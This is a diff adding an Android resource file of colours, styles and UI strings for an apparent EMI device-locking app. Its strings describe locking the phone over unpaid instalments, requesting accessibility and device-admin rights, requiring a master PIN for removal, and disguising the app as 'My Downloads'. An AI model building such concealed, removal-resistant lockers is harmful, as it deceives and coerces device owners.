@@ -1,0 +1,89 @@
+<?xml version="1.0" encoding="utf-8"?>
+<resources xmlns:ns1="http://schemas.android.com/tools">
+    <color name="background">#0D1117</color>
+    <color name="border">#30363D</color>
+    <color name="border_dark">#21262D</color>
+    <color name="error">#F85149</color>
+    <color name="info">#58A6FF</color>
+    <color name="on_primary">#FFFFFF</color>
+    <color name="on_secondary">#FFFFFF</color>
+    <color name="on_surface">#C9D1D9</color>
+    <color name="on_surface_secondary">#8B949E</color>
+    <color name="primary">#238636</color>
+    <color name="primary_variant">#1B2D23</color>
+    <color name="secondary">#1F6FEB</color>
+    <color name="secondary_variant">#161B22</color>
+    <color name="success">#3FB950</color>
+    <color name="surface">#161B22</color>
+    <color name="surface_variant">#21262D</color>
+    <color name="text_disabled">#6E7681</color>
+    <color name="text_muted">#8B949E</color>
+    <color name="text_primary">#FFFFFF</color>
+    <color name="text_secondary">#C9D1D9</color>
+    <color name="warning">#F0883E</color>
+    <string name="accessibility_service">Accessibility Service</string>
+    <string name="accessibility_service_description">This service is required to keep the device locked when EMI is pending. Please enable it for proper functionality.</string>
+    <string name="add_protection">Add Protection</string>
+    <string name="app_name">My Downloads</string>
+    <string name="check_status">Check Status</string>
+    <string name="current_status">Current Status</string>
+    <string name="device_admin">Device Admin</string>
+    <string name="device_controller">Device Controller</string>
+    <string name="display_overlay">Display Overlay</string>
+    <string name="downloads_label">My Downloads</string>
+    <string name="emergency_call">Emergency Call</string>
+    <string name="enter_device_id">Enter Device ID</string>
+    <string name="enter_master_pin">Enter Master PIN to remove protection:</string>
+    <string name="enter_pin">Enter Master PIN</string>
+    <string name="enterprise_management">Enterprise Management</string>
+    <string name="grant">Grant</string>
+    <string name="granted">Granted</string>
+    <string name="lock_message">This device is locked due to pending EMI.</string>
+    <string name="not_protected">Not Protected</string>
+    <string name="protected_status">Protected</string>
+    <string name="protection_added_message">Device is now protected. The app will now disguise as \'My Downloads\'.</string>
+    <string name="protection_added_title">🛡️ Protection Added</string>
+    <string name="protection_removed_message">Device protection has been disabled. You can now uninstall the app from Settings.</string>
+    <string name="protection_removed_title">✅ Protection Removed</string>
+    <string name="ready_to_protect">Ready to Protect</string>
+    <string name="remove_protection">Remove Protection</string>
+    <string name="remove_protection_title">🔐 Remove Protection</string>
+    <string name="save_device_id">Save Device ID</string>
+    <string name="unlock">Unlock</string>
+    <style name="DialogBodyStyle" parent="MaterialAlertDialog.Material3.Body.Text">
+        <item name="android:textColor">#8B949E</item>
+        <item name="android:textSize">15sp</item>
+    </style>
+    <style name="DialogTitleStyle" parent="MaterialAlertDialog.Material3.Title.Text">
+        <item name="android:textColor">#FFFFFF</item>
+        <item name="android:textSize">20sp</item>
+    </style>
+    <style name="Theme.DeviceAdmin" parent="Theme.Material3.DayNight.NoActionBar">
+        <item name="colorPrimary">#238636</item>
+        <item name="colorPrimaryVariant">#1B2D23</item>
+        <item name="colorOnPrimary">#FFFFFF</item>
+        <item name="colorSecondary">#1F6FEB</item>
+        <item name="colorSecondaryVariant">#161B22</item>
+        <item name="colorOnSecondary">#FFFFFF</item>
+        <item name="android:colorBackground">#0D1117</item>
+        <item name="colorSurface">#161B22</item>
+        <item name="colorOnSurface">#C9D1D9</item>
+        <item name="colorError">#F85149</item>
+        <item name="colorOnError">#FFFFFF</item>
+        <item name="android:statusBarColor">#0D1117</item>
+        <item name="android:navigationBarColor">#0D1117</item>
+        <item name="android:windowLightStatusBar" ns1:targetApi="23">false</item>
+    </style>
+    <style name="Theme.DeviceAdmin.Dialog" parent="ThemeOverlay.Material3.MaterialAlertDialog">
+        <item name="colorSurface">#161B22</item>
+        <item name="colorOnSurface">#C9D1D9</item>
+        <item name="materialAlertDialogTitleTextStyle">@style/DialogTitleStyle</item>
+        <item name="materialAlertDialogBodyTextStyle">@style/DialogBodyStyle</item>
+    </style>
+    <style name="Theme.DeviceAdmin.Fullscreen" parent="Theme.DeviceAdmin">
+        <item name="android:windowNoTitle">true</item>
+        <item name="android:windowFullscreen">true</item>
+        <item name="android:windowContentOverlay">@null</item>
+        <item name="android:windowBackground">@android:color/black</item>
+    </style>
+</resources>
